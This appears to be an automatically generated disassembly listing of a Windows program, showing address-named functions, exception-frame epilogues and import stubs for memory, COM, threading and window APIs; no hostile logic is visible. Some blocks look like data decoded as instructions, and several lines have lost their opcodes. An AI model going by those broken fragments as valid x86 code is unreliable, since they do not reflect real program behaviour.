xchg edx eax
call sub_4028e8
retn
sub_406c8c
xor eax eax
retn
sub_406c90
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406ca0
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406cbc
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406cd0
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406d08
call sub_406c64
retn
sub_406d10
call sub_406c64
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406eed
jmp sub_403a2c
sub_406ef4
pop ebp
retn
sub_406ef8
sub [ rw-data ] 0x1
retn
sub_406f25
jmp sub_403a2c
sub_406f2c
pop ebp
retn
sub_406f30
sub [ rw-data ] 0x1
retn
sub_407255
jmp sub_403a2c
sub_40725c
pop ebp
retn
sub_407260
sub [ rw-data ] 0x1
retn
sub_407d41
add eax 0xffffffd4
jmp sub_40d4fc
sub_407d49
add eax 0xffffffd4
jmp sub_40d3a4
sub_407d51
add eax 0xffffffd4
jmp sub_40d440
sub_407d63
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a18
sub_407d6d
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a2c
sub_407e44
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
pop ebx
retn
sub_408688
call sub_408664
retn
sub_408720
push eax
call CloseHandle
retn
sub_408790
push ebx
mov ebx eax
mov eax ebx
call sub_408728
inc eax
setne al
pop ebx
retn
sub_408920
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408934
push esi
mov esi eax
xchg edx eax
call sub_4028e8
mov eax esi
pop esi
retn
sub_408af4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4042a4
pop esi
pop ebx
retn
sub_408b08
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026ec
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408b1c
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408b54
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_40270c
sub_408bbc
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402848
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408be0
push ebx
mov ebx eax
mov eax ebx
call sub_4040ac
pop ebx
retn
sub_408f43
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_4040ac
pop eax
pop ebx
retn
sub_4091fb
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_409356
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4096b3
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4096b3
sub_409770
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40456c
mov edx esi
xor ecx ecx
call sub_4095fc
pop esi
pop ebx
retn
sub_4097e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40456c
mov edx esi
mov cl 0x1
call sub_4095fc
pop esi
pop ebx
retn
sub_40a056
jmp sub_403a2c
sub_40a05d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a14e
jmp sub_403a2c
sub_40a155
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a8f9
jmp sub_403a2c
sub_40a900
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a9a0
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a92c
pop ebp
retn 0x8
sub_40aae5
jmp sub_403a2c
sub_40aaec
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40af8f
jmp sub_403a2c
sub_40af96
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b4e3
jmp sub_403a2c
sub_40b4ea
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b595
jmp sub_403a2c
sub_40b59c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b63f
jmp sub_403a2c
sub_40b646
pop esi
pop ecx
pop ebp
retn
sub_40b822
jmp sub_403a2c
sub_40b829
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b880
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40bb72
jmp sub_403a2c
sub_40bc40
jmp sub_403a2c
sub_40bc68
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403264
sub_40be04
jmp sub_403a2c
sub_40be0b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40be14
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403a64
sub_40be21
retn
sub_40be24
push ebp
mov ebp esp
call sub_40bd68
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40be14
pop ebp
retn 0x4
sub_40be40
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
retn
sub_40bed8
push ebx
mov ebx eax
mov eax ebx
call sub_40be58
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40c0ab
jmp sub_403a2c
sub_40c0b2
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c177
jmp sub_403a2c
sub_40c17e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c188
call sub_40ba14
mov eax 0x1
call sub_404010
sub_40c30c
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c3e5
jmp sub_403a2c
sub_40c402
jmp sub_403a2c
sub_40c409
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c4b4
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c418
mov ecx eax
sub_40c6a0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c6c0
push eax
call CharNextA
retn
sub_40c958
jmp sub_403a2c
sub_40c95f
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c9c8
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40ce1f
jmp sub_403a2c
sub_40ce26
pop ebx
mov esp ebp
pop ebp
retn
sub_40cfef
jmp sub_403a2c
sub_40cff6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40d098
jmp sub_403a2c
sub_40d09f
pop ebx
mov esp ebp
pop ebp
retn
sub_40d0a4
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40d008
sub_40d0b4
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40d0d0
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_40270c
pop ebx
retn
sub_40d158
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d164
xchg [ eax ] edx
mov eax edx
retn
sub_40d1c4
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d254
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d36c
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d394
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d60f
jmp sub_403a2c
sub_40d616
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d684
jmp sub_403a2c
sub_40d68b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d6a9
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d6a2
jmp sub_403a2c
sub_40d6a9
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d6b4
sbb eax 0x4000000
retn
sub_40d6ba
dec eax
add [ eax - 0x3ffb726 ] ah
retn 0x48
sub_40d6c6
dec eax
add ah dh
retn 0x48
sub_40d6cd
salc
dec eax
add ah ch
retn 0x48
sub_40d6d4
adc al 0xdb
dec eax
add ah ah
retn 0x48
sub_40d6ee
dec eax
add ah cl
retn 0x48
sub_40d6f4
pushfd
salc
dec eax
add ah al
retn 0x48
sub_40d7e4
test al 0xd7
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 ] al
dec eax
add [ edi + edx * 8 ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x48
sub_40d882
dec eax
add [ eax ] al
add [ eax ] al
add al dl
ror [ eax ] 0x48
fmul [ eax ]
add [ eax ] al
add [ eax ] al
int3
sub_40db6c
jmp sub_403a2c
sub_40db73
pop ebp
retn
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40dbec
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40dc52
jmp sub_403a2c
sub_40dc59
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dcbe
jmp sub_403a2c
sub_40dcc5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dd2a
jmp sub_403a2c
sub_40dd31
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dd96
jmp sub_403a2c
sub_40dd9d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40de02
jmp sub_403a2c
sub_40de09
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40de81
jmp sub_403a2c
sub_40de88
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40def4
jmp sub_403a2c
sub_40defb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40df64
jmp sub_403a2c
sub_40df6b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dfd8
jmp sub_403a2c
sub_40dfdf
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40e365
jmp sub_403a2c
sub_40e36c
pop ebp
retn
sub_40e370
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40e034
sub_40e381
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40ea0a
jmp sub_403a2c
sub_40eaa3
jmp sub_403a2c
sub_40eaaa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eafa
jmp sub_403a2c
sub_40eb01
pop ecx
pop ebp
retn
sub_40eb4e
jmp sub_403a2c
sub_40eb55
pop ecx
pop ebp
retn
sub_40ebe7
jmp sub_403a2c
sub_40ebee
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ec3e
jmp sub_403a2c
sub_40ec45
pop ecx
pop ebp
retn
sub_40ee8d
jmp sub_403a2c
sub_40ee94
pop ebx
mov esp ebp
pop ebp
retn
sub_40efaa
jmp sub_403a2c
sub_40efb1
pop ecx
pop ebp
retn
sub_40efb4
push ebx
mov ebx eax
mov eax ebx
call sub_40f24c
mov [ ebx ] 0x1
pop ebx
retn
sub_40f260
push eax
call sub_40f24c
pop eax
retn
sub_40f4c0
call sub_40f574
retn
sub_40f614
jmp sub_403a2c
sub_40f61b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f662
jmp sub_403a2c
sub_40f669
pop ebx
pop ecx
pop ebp
retn
sub_40f6ae
jmp sub_403a2c
sub_40f6b5
pop ebx
pop ecx
pop ebp
retn
sub_40f6fa
jmp sub_403a2c
sub_40f701
pop ebx
pop ecx
pop ebp
retn
sub_40f746
jmp sub_403a2c
sub_40f74d
pop ebx
pop ecx
pop ebp
retn
sub_40fb0f
jmp sub_403a2c
sub_40fb16
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fbb0
jmp sub_403a2c
sub_40fbb7
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410025
jmp sub_403778
sub_4100e0
jmp sub_403778
sub_410187
jmp sub_403778
sub_410280
jmp sub_403778
sub_410359
jmp sub_403778
sub_410441
jmp sub_403778
sub_4105fe
jmp sub_403a2c
sub_410605
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410667
jmp sub_403a2c
sub_41066e
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410ad4
jmp sub_403778
sub_410bc3
jmp sub_403a2c
sub_410bca
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410c68
jmp sub_403a2c
sub_410c6f
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41100c
call sub_410cc4
neg al
sbb eax eax
neg eax
retn
sub_4110cd
jmp sub_403a2c
sub_4110d4
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41117d
jmp sub_403a2c
sub_411184
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4116d5
jmp sub_403778
sub_4117dc
jmp sub_403a2c
sub_4117e3
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4118ed
jmp sub_403a2c
sub_4118f4
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411d44
jmp sub_403a2c
sub_411d4b
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411e55
jmp sub_403a2c
sub_411e5c
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4123a2
jmp sub_403a2c
sub_4123a9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41244d
jmp sub_403a2c
sub_412454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412476
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4047d0
retn
sub_41246f
jmp sub_403a2c
sub_412476
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4124d2
jmp sub_403a2c
sub_4124d9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412555
jmp sub_403a2c
sub_412a9b
jmp sub_403a2c
sub_412aa2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412b35
jmp sub_403a2c
sub_412b3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b59
lea eax [ ebp - 0x14 ]
call sub_4047b8
retn
sub_412b52
jmp sub_403a2c
sub_412b59
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412bb6
jmp sub_403a2c
sub_412bbd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412c5f
jmp sub_403a2c
sub_412c7c
jmp sub_403a2c
sub_412c83
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4131de
jmp sub_403a2c
sub_4131e5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413256
jmp sub_403a2c
sub_41325d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4135e8
push eax
call sub_40f24c
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4135fc
push eax
call sub_40f24c
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413787
jmp sub_403a2c
sub_4137b3
jmp sub_403a2c
sub_4137ba
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4139e7
jmp sub_403a2c
sub_4139ee
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413c8f
jmp sub_403a2c
sub_413d1d
jmp sub_403a2c
sub_413e0d
jmp sub_403a2c
sub_413eaf
jmp sub_403a2c
sub_413f65
jmp sub_403a2c
sub_41400c
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f574
add esp 0x10
sub_4142b6
jmp sub_403a2c
sub_4142bd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414300
mov ax [ eax ]
retn
sub_414400
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f24c
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_414418
mov edx 0x80020004
call sub_414400
retn
sub_414468
mov dl 0x1
call sub_414470
retn
sub_4144ac
[ esp + 0x40 ]
sub_41451d
jmp sub_403a2c
sub_414524
pop esi
pop ebx
pop ebp
retn
sub_414528
push ebp
mov ebp esp
call sub_4146e8
pop ebp
retn 0x4
sub_4145b4
push ebp
mov ebp esp
call sub_4146e8
pop ebp
retn 0x4
sub_414697
jmp sub_403a2c
sub_41469e
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4032a0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40364c
sub_4146c0
xor eax eax
retn
sub_4146c4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4146d8
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4146e0
call sub_40e9c0
retn
sub_4146e8
call sub_40eab0
retn
sub_4146f0
call sub_40ef60
retn
sub_4146f8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41470c
call sub_4146e8
retn
sub_414714
push ebp
mov ebp esp
call sub_4146f0
pop ebp
retn 0x8
sub_41472c
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_414808
jmp sub_403a2c
sub_4148d1
jmp sub_403a2c
sub_4148d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148f5
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
sub_4148ee
jmp sub_403a2c
sub_4148f5
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414900
call sub_40efb4
retn
sub_414908
mov ecx 0xe
call sub_413fa4
cmp al 0x1
retn
sub_414987
jmp sub_403a2c
sub_41498e
pop ebp
retn
sub_414a31
jmp sub_403a2c
sub_414a38
pop ebp
retn
sub_414b61
jmp sub_403a2c
sub_414b68
pop ebp
retn
sub_414b6c
sub [ rw-data ] 0x1
retn
sub_414c6a
jmp sub_403a2c
sub_414c71
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414f90
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_414ef8
mov eax ebx
mov edx esp
call sub_404310
add esp 0x100
pop ebx
retn
sub_414fec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_404100
pop esi
pop ebx
retn
sub_4150c8
jmp sub_403a2c
sub_4150cf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415120
jmp sub_403a2c
sub_415127
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415274
jmp sub_403a2c
sub_41527b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41534a
jmp sub_403a2c
sub_415351
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415668
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f574
pop esi
pop ebx
retn
sub_415912
jmp sub_403a2c
sub_415919
pop ebp
retn
sub_41591c
sub [ rw-data ] 0x1
retn
CoInitialize
jmp [ CoInitialize@IAT ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
CoTaskMemAlloc
jmp [ __import_lookup_table_12(ole32:CoTaskMemAlloc) ]
sub_415969
jmp sub_403a2c
sub_415970
pop ebp
retn
sub_415974
sub [ rw-data ] 0x1
retn
sub_416277
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4191a0
sub_416281
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4191c0
sub_416573
[ edx + ebx * 4 + 0x54100041 ]
sub_416be2
retn 0x416b
sub_416fb7
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_417348
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_4173bc
push ecx
mov [ esp ] eax
cmp [ esp ] 0xffff
jne r-xdata
xor eax eax
pop edx
retn
cmp [ esp + 0x2 ] 0xffff
je r-xdata
mov al 0x1
pop edx
retn
sub_417488
mov eax [ eax + 0xc ]
call sub_418854
retn
sub_41775f
jmp sub_403a2c
sub_417766
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41776c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418a0c
test eax eax
setge al
pop esi
pop ebx
retn
sub_417a6f
jmp sub_403a2c
sub_417a76
mov esp ebp
pop ebp
retn
sub_417b44
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_417b50
push ebx
mov ebx edx
mov edx ebx
call sub_417964
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4176c4
sub_417bfc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_417d57
jmp sub_403a2c
sub_417e2b
jmp sub_403a2c
sub_417e3c
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_417ea8
jmp sub_403a2c
sub_417eaf
pop ebx
mov esp ebp
pop ebp
retn
sub_417efa
jmp sub_403a2c
sub_417f01
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417f8d
jmp sub_403a2c
sub_417f94
pop ebx
pop ebp
retn
sub_417fda
jmp sub_403a2c
sub_417fe1
pop ebx
pop ebp
retn
sub_418026
jmp sub_403a2c
sub_41802d
pop ebx
pop ebp
retn
sub_418077
jmp sub_403a2c
sub_41807e
pop esi
pop ebx
pop ebp
retn
sub_4180d2
jmp sub_403a2c
sub_4180d9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_418206
jmp sub_403a2c
sub_418282
jmp sub_403a2c
sub_418358
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_418b4c
sub_418448
jmp sub_403a2c
sub_4185d2
jmp sub_403a2c
sub_4185d9
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418673
jmp sub_403a2c
sub_41867a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418699
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418692
jmp sub_403a2c
sub_418699
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_418705
jmp sub_403a2c
sub_41870c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418804
jmp sub_403a2c
sub_41880b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
sub_418821
jmp sub_403a2c
sub_418888
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418ba8
xor edx edx
mov eax ebx
call sub_418b6c
pop ebx
retn
sub_418900
mov eax [ ebp + 0x4 ]
retn
sub_418936
pop ecx
pop edx
pop esi
pop ebx
retn
sub_418984
jmp sub_403a2c
sub_41898b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418990
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4189a8
xor edx edx
call sub_4189b0
retn
sub_418a98
mov edx [ eax + 0x8 ]
dec edx
call sub_4189b0
retn
sub_418c18
retn
sub_418cd2
jmp sub_403a2c
sub_418cd9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40364c
sub_418d68
jmp sub_403a2c
sub_418d6f
pop ebx
pop ecx
pop ebp
retn
sub_418d74
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_418dcb
jmp sub_403a2c
sub_418dd2
pop ebx
pop ecx
pop ebp
retn
sub_418dd8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_418e14
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
retn
sub_418e2c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_418f07
retn
sub_418fac
test edx edx
je r-xdata
xor edx edx
call sub_418fc0
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_419076
jmp sub_403a2c
sub_41907d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419090
xchg edx eax
call sub_418fc0
retn
sub_419098
retn
sub_419131
jmp sub_403a2c
sub_419138
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41918e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_4192f5
jmp sub_403a2c
sub_4192fc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419465
jmp sub_403a2c
sub_41946c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194b0
xor edx edx
call sub_41936c
retn
sub_41961e
jmp sub_403a2c
sub_419638
inc [ eax + 0xc ]
retn
sub_41963c
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4196a6
jmp sub_403a2c
sub_4196b4
dec [ eax + 0xc ]
call sub_41963c
retn
sub_4196f0
xor eax eax
retn
sub_4196f4
push ebx
mov ebx ecx
mov eax ebx
call sub_4040ac
pop ebx
retn
sub_4197ea
jmp sub_403a2c
sub_4197f1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419901
jmp sub_403a2c
sub_4199f8
retn
sub_4199fc
retn
sub_419a3c
retn
sub_419a40
retn
sub_419aac
mov eax [ eax + 0x18 ]
retn
sub_419bb2
jmp sub_403a2c
sub_419bb9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bd6
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_419bcf
jmp sub_403a2c
sub_419bd6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c60
jmp sub_403a2c
sub_419c78
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419d34
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419ddd
jmp sub_403a2c
sub_419de4
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419df0
mov eax [ ebp + 0x4 ]
retn
sub_419e26
pop ecx
pop edx
pop esi
pop ebx
retn
sub_419e74
jmp sub_403a2c
sub_419e7b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419f3a
jmp sub_403a2c
sub_419f41
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f63
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040d0
retn
sub_419f5c
jmp sub_403a2c
sub_419f63
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
